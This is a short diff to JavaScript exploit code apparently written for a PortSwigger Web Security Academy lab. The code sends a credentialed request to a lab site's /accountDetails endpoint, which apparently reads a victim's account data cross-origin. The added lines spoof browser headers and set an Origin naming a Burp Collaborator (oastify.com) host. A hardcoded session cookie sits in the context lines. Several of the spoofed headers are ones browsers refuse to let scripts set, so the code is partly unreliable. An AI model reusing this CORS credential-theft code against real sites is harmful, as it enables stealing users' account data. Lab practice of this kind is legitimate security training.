@@ -24,6 +24,19 @@
             };
             req.open('GET', 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails', true);
             req.withCredentials = true;
+            req.setRequestHeader('Sec-Ch-Ua', '"Chromium";v="125", "Not.A/Brand";v="24"');
+            req.setRequestHeader('Sec-Ch-Ua-Mobile', '?0');
+            req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36');
+            req.setRequestHeader('Sec-Ch-Ua-Platform', '"Windows"');
+            req.setRequestHeader('Accept', '*/*');
+            req.setRequestHeader('Sec-Fetch-Site', 'same-origin');
+            req.setRequestHeader('Sec-Fetch-Mode', 'cors');
+            req.setRequestHeader('Sec-Fetch-Dest', 'empty');
+            req.setRequestHeader('Referer', 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/my-account?id=wiener');
+            req.setRequestHeader('Accept-Encoding', 'gzip, deflate, br');
+            req.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
+            req.setRequestHeader('Ngrok-Skip-Browser-Warning', 'true');
+            req.setRequestHeader('Origin', 'https://f4kxclwmypcy9h0hk3z0xbjlmcs3gwgk5.oastify.com');
             req.setRequestHeader('Cookie', 'session=DNtqhFXfLDOFcppx1UwvvOJmhyhXiNU5');
             req.send();
         }
